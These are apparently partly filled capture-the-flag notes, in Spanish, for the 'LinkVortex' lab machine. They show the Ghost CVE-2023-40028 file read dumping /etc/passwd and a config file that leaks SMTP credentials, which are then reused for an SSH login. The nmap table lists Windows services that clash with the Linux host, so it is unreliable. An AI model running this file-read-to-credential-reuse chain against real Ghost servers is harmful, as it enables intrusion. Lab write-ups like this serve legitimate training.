Template

---

## Nmap Summary
| Port | Software    | Version                                 | Status  |
| ---- | ----------- | --------------------------------------- | ------- |
| 53   | domain      | Simple DNS                              | open    |
| 80   | http        | Apache http 2.4.29                      | open    |
| 139  | netbios-sec | Microsfot Windows netbios-ssn           | open    |
| 389  | ldap        | Microsoft Windows Active Directory LDAP | open    |


## Information Recon

Ports tcp open in nmap format

```bash

```

Ports services and versions nmap format

```bash

```

Ports UDP nmap format

```bash

```

---

## Enumeration

# FFuzz y FeroxBuster


# Arbitrary File Read (CVE-2023-40028)
- Con el Arbitrary read file vemos el /etc/passwd
```java
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
file> 

```
Vemos que el usuario node existe en el sistema y tiene una bash shell;

Tambien sacamos el archivo  `/var/lib/ghost/config.production.json` que venia en el Dockerfile que sacamos de dev.linkvortex.htb

```bash
       │ File: Dockerfile.ghost
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ FROM ghost:5.58.0
   2   │ 
   3   │ # Copy the config
   4   │ COPY config.production.json /var/lib/ghost/config.production.json
   5   │ 
   6   │ # Prevent installing packages
   7   │ RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/
       │ dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
   8   │ 
   9   │ # Wait for the db to be ready first
  10   │ COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
  11   │ COPY entry.sh /entry.sh
  12   │ RUN chmod +x /var/lib/ghost/wait-for-it.sh
  13   │ RUN chmod +x /entry.sh
  14   │ 
  15   │ ENTRYPOINT ["/entry.sh"]
  16   │ CMD ["node", "current/index.js"]

```

config.production.json
Sacamos un nuevo correo y una direccion de puerto local donde se esta ejecutando un servicio , probablemente ghost:
```bash
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

```
Tenemos el usuario bob y su password 

bob@linkvortex.htb:fibber-talented-worth

Probamos ssh:
```bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ whoami
bob

```





---

